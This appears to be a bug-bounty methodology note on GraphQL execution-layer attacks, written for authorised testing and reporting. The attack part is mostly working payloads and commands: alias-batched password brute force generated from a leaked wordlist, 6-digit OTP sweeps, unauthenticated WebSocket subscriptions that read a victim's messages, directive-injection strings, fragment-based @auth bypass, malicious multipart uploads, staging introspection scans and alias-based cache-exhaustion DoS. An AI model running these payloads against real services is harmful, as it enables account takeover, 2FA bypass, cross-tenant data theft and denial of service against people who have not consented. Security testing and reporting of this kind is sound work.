---
type: pattern
title: "Pattern - GraphQL Deep Techniques"
vuln_class: graphql
last_updated: 2026-06-03
tags:
  - bb-pattern
  - sota-2024
status: active
---

# Pattern: GraphQL Deep Techniques -- Batching, Alias, Subscription, Directive Abuse

> Most GraphQL testing stops at the introspection / field-suggestion stage. The truly high-ROI attack surface lies in the **execution layer**: batching, alias, subscription auth, directive injection, and staging introspection re-enable. These techniques bypass not "validation" but "the platform's implicit trust in query structure."

## Summary

The GraphQL spec allows a single HTTP request to carry multiple queries / multiple aliases / custom directives / WebSocket subscriptions, and these primitives share the same resolver in most backends. However, **security controls (rate limit, auth middleware, cost limit, cache) are typically applied at the "HTTP request" or "top-level field" layer**, resulting in:

- One HTTP request -> N resolver invocations -> rate limit / brute-force protection bypass
- @auth directive only checks top-level field -> fragment / inline spread bypass
- Subscriptions use WebSocket -> HTTP middleware (CSRF / auth header / rate limit) entirely bypassed
- Custom directives with query strings assembled via template concatenation -> directive injection alters query behavior
- Staging / dev environments often re-enable introspection -> full schema disclosure

**Anti-exaggeration stop-loss**: Alias batching enabling brute-force does not equate to direct ATO; a `verified_evidence: live` level PoC is required (one request receiving N resolver responses, with at least one response containing a success signal -- token / session / 200, etc.) to qualify as P2 or above. Theoretical-only can only be written as P4.

Detailed references: [PortSwigger Lab: Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass) and [Checkmarx -- GraphQL Batching Attack](https://checkmarx.com/blog/didnt-notice-your-rate-limiting-graphql-batching-attack/).

---

## Detection Signals

| Signal | Tool | Implication |
|--------|------|-------------|
| `POST /graphql` body is JSON array `[{query:...}, {query:...}]` returns 200 | curl | Query batching enabled |
| Response body is array of `{data: ...}` | curl | Batching engine confirmed |
| Multiple aliases within a single mutation all execute (response contains multiple alias keys) | curl | Alias execution confirmed |
| Same mutation sent 100 times individually never triggers 429, but 100 aliases in one request succeeds | curl + jq | Rate limit is at HTTP layer, not counting resolvers |
| `wss://` or `/subscriptions` / `/graphql-ws` endpoint exists | nuclei / wscat | Subscription endpoint |
| WebSocket `connection_init` payload without token is accepted | wscat | Subscription has no auth |
| Schema contains `directive @auth` / `@hasRole` / `@cache` / `@cost` | introspection / .graphql files | Custom directives, potential injection targets |
| Same query with `@unknownDirective(x: 1)` still returns 200 / error message leaks directive names | curl | Directive parser is not strict |
| `/graphql` on prod has introspection disabled, but `staging.` / `dev.` / `api-stage.` has it enabled | nuclei / host enum | Staging introspection re-enable |
| Apollo / Hasura `__schema { types { name } }` returns full schema in certain environments | curl | Introspection drift |
| `multipart/form-data` with `operations` + `map` + `0` file successfully uploads | curl `-F` | GraphQL multipart upload spec (@upload) enabled |

---

## Test Methodology

### Step 1: Confirm batching engine

```bash
ENDPOINT="https://target.tld/graphql"

# JSON-array batching (apollo-server batchHttp)
curl -s -X POST "$ENDPOINT" \
  -H 'content-type: application/json' \
  -d '[{"query":"{__typename}"},{"query":"{__typename}"}]' | jq '.'

# Response is array -> batching enabled
# Response is single error / 400 -> try alias batching (always available)
```

### Step 2: Alias-based brute force (PortSwigger / Checkmarx template)

```graphql
# Send 100 password attempts in one HTTP request -- bypasses per-request rate limit
mutation BruteLogin {
  a1: login(username: "victim", password: "Password1") { token }
  a2: login(username: "victim", password: "Password123") { token }
  a3: login(username: "victim", password: "Welcome2026") { token }
  # ... repeat N times
}
```

```bash
# Programmatically generate 1000 aliases
python3 -c '
import json
pwds = open("rockyou-top1000.txt").read().splitlines()
aliases = "\n  ".join(f"a{i}: login(username:\"victim\",password:\"{p}\") {{ token }}" for i,p in enumerate(pwds))
print(json.dumps({"query": "mutation { " + aliases + " }"}))
' > payload.json

curl -s -X POST "$ENDPOINT" -H 'content-type: application/json' --data-binary @payload.json \
  | jq '.data | to_entries | map(select(.value.token != null))'
# Alias keys that appear indicate successfully guessed passwords
```

Tool: [CrackQL](https://github.com/nicholasaleks/CrackQL) -- alias-based brute force / fuzzing framework.

### Step 3: 2FA / OTP bypass

```graphql
mutation OtpSweep {
  a000: verifyOtp(code: "000000") { success }
  a001: verifyOtp(code: "000001") { success }
  # ... up to 999999 (full 6-digit expansion is too large; batch 1k at a time)
}
```

If OTP rate limit is at the HTTP layer -> a single request can try N codes.

### Step 4: Subscription auth bypass

```bash
# 1) Connect without token
wscat -c "wss://target.tld/graphql" \
  -s graphql-transport-ws \
  -x '{"type":"connection_init","payload":{}}'

# Receiving {"type":"connection_ack"} = no auth gate

# 2) Run subscription -- directly read other users' event streams
wscat -c "wss://target.tld/graphql" \
  -s graphql-transport-ws \
  -x '{"type":"subscribe","id":"1","payload":{"query":"subscription { messageAdded(roomId: \"VICTIM_ROOM\") { id body author } }"}}'
```

Key difference: HTTP middleware (cookie / Authorization header / CSRF token) **only runs once** during the WebSocket handshake, and servers often forget to re-validate authorization on each subscription operation.

### Step 5: Directive injection (query template concatenation)

When a client app concatenates queries (e.g., BFF takes user input into a sort field):

```graphql
# vulnerable template
products(sort: "${userInput}") { id name }

# Payload
"price") @include(if: true) @customDirective(arg: "malicious") #

# Injected query becomes
products(sort: "price") @include(if: true) @customDirective(arg: "malicious") #") { id name }
```

Injection points: BFF, low-code platforms (Retool / Hasura action), custom SDK wrappers.

### Step 6: @auth bypass via fragment / inline spread

```graphql
# Direct query -- @auth intercepts
query Direct {
  sensitiveData { ssn }
}

# Bypass -- some middleware only checks top-level field name, does not recursively parse fragments
query StealthyBypass {
  ... on Query {
    sensitiveData { ssn }
  }
}

# Variant: named fragment
query FragBypass {
  ...Sensitive
}
fragment Sensitive on Query {
  sensitiveData { ssn }
}
```

Reference: [InstaTunnel -- Directive Deception](https://instatunnel.my/blog/directive-deception-exploiting-custom-graphql-directives-for-logic-bypass).

### Step 7: File upload via multipart spec (@upload)

```bash
# GraphQL multipart spec (jaydenseric/graphql-multipart-request-spec)
curl -s -X POST "$ENDPOINT" \
  -F operations='{"query":"mutation($f:Upload!){singleUpload(file:$f){url}}","variables":{"f":null}}' \
  -F map='{"0":["variables.f"]}' \
  -F 0=@evil.svg
```

Attack surface: MIME type not checked at GraphQL layer, subresolver writes file back to original storage path, returned URL contains path traversal.

### Step 8: Staging introspection re-enable

```bash
# Enumerate common subdomains
for host in staging dev qa test api-stage api-dev preview internal; do
  curl -s -o /dev/null -w "%{http_code} $host\n" \
    -X POST "https://$host.target.tld/graphql" \
    -H 'content-type: application/json' \
    -d '{"query":"{__schema{types{name}}}"}'
done

# 200 + schema body = introspection enabled
```

Many companies use `NODE_ENV=production` to disable introspection on prod, but staging / preview runs `development`, leaking the full schema (including hidden mutations / admin fields).

### Step 9: Cache miss directive overload (DoS variant)

```graphql
query Exhaustion($r: String) {
  heavyReport(id: "123") @cache(ttl: 0)
  a1: heavyReport(id: "123", dummy: $r)
  a2: heavyReport(id: "123", dummy: $r)
  # ... 100 aliases
}
```

The `dummy` parameter makes each alias appear as a different query, bypassing resolver-level cache.

---

## Variants / Common Bypass Techniques

| Technique | Trigger Prerequisite | Payload Form | Impact |
|-----------|---------------------|--------------|--------|
| JSON-array batch | Apollo `batchHttp` / express-graphql array body | `[{query},{query}]` | Rate limit / cost limit bypass |
| Alias brute force | Spec-standard, almost all GQL servers support it | `a1: login(...) a2: login(...)` | Credential / OTP / token brute force |
| Subscription handshake bypass | `/graphql-ws` / `/subscriptions` open | `connection_init` without token | Read others' event streams, cross-tenant |
| Subscription resource exhaustion | No per-connection concurrency / idle timeout | Open N WS subscriptions to heavy resolver | DoS |
| Directive injection | Query template concatenates user input | `") @include(if:true) @evil(...) #` | Behavior modification / internal directive trigger |
| Fragment / inline-spread @auth bypass | Middleware does not recursively parse fragments | `... on Query { protected }` | Authorization bypass |
| Unknown directive overload | Parser tolerates unknown directives | 1100x `@x @y @z ...` | CPU DoS |
| Multipart upload abuse | `graphql-upload` enabled, MIME not checked | `-F operations -F map -F 0=@evil` | SSRF / RCE / stored XSS |
| Staging introspection | Env flags not consistent | `{__schema{types{name}}}` on staging | Schema leak -> hidden mutation chain |
| Persisted query bypass | Server accepts both ad-hoc + APQ | Use ad-hoc endpoint to skip allowlist | Re-enables all above techniques |

---

## Severity Guide

| Condition | Severity | Explanation |
|-----------|----------|-------------|
| Alias brute force obtains valid token / session (live PoC) | **P1 Critical** | End-to-end ATO; rate limit failure + credential leak |
| Subscription auth bypass reads other tenants' message / event content | **P1-P2** | Depends on data sensitivity (PII / financial = P1) |
| Multipart upload bypass -> stored XSS / SSRF / RCE | **P1-P2** | Depends on chain endpoint |
| Directive injection modifies query to obtain others' data | **P2 High** | Depends on field sensitivity |
| @auth fragment bypass obtains protected fields | **P2 High** | Equivalent to BAC |
| OTP / 2FA alias bypass (1 request tests all 6-digit codes) | **P2 High** | Combined with phishing / known username can achieve ATO |
| Staging introspection leaks full schema (including hidden mutation names) | **P3 Medium** | Itself is info disclosure, but commonly a chain starting point |
| Alias batching works but rate-limit alert triggers / no token leak | **P3 Medium** | Batching observed working but no end-to-end breakthrough |
| Cache miss / directive overload DoS (PoC < 5s p99 spike) | **P3-P4** | Bug bounty platforms mostly require specific impact data |
| Only introspection enabled, prod has no sensitive fields | **P4-P5** | Most platforms reject pure introspection (see always-rejected list) |
| Unknown directive overload at syntax level only, no CPU data | **P5 / N/A** | No quantified impact = not accepted |

**Anti-exaggeration reminder**: Alias / batching being accepted by the server (i.e., "server accepts multiple operations") is **not a vulnerability by itself** (spec behavior). What constitutes a reportable finding is "rate limit / brute-force protection / cost limit bypass + end-to-end impact." Reports must provide numerical evidence (e.g., "within 60 seconds via 1 HTTP request, 5000 passwords were attempted, the server did not trigger lockout, and the 3742nd alias in the response returned a valid token").

---

## Cross-reference

- [[Pattern - GraphQL Field Suggestion Enumeration]] -- Using didYouMean to infer schema when introspection is disabled; this pattern is the next step (running execution-layer techniques after obtaining the schema)
- [[Pattern - SaaS Marketplace OAuth Defaults]] -- Same "platform defaults are insecure -> network-wide impact" reasoning; GraphQL equivalent is staging introspection / batching enabled by default

### References

- [PortSwigger Lab -- Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)
- [Checkmarx -- Didn't Notice Your Rate Limiting: GraphQL Batching Attack](https://checkmarx.com/blog/didnt-notice-your-rate-limiting-graphql-batching-attack/)
- [Escape.tech -- Avoid GraphQL DoS through batching and aliasing](https://escape.tech/blog/graphql-batch-attacks-cause-dos/)
- [InstaTunnel -- Directive Deception: Bypassing Security with GraphQL](https://instatunnel.my/blog/directive-deception-exploiting-custom-graphql-directives-for-logic-bypass)
- [HackerOne -- How a GraphQL Bug Resulted in Authentication Bypass](https://www.hackerone.com/blog/how-graphql-bug-resulted-authentication-bypass)
- [Tyk -- GraphQL security: 7 common vulnerabilities](https://tyk.io/blog/graphql-security-7-common-vulnerabilities-and-how-to-mitigate-the-risks/)
- [CrackQL -- GraphQL brute-force / fuzz tool](https://github.com/nicholasaleks/CrackQL)
- [graphql-multipart-request-spec](https://github.com/jaydenseric/graphql-multipart-request-spec)
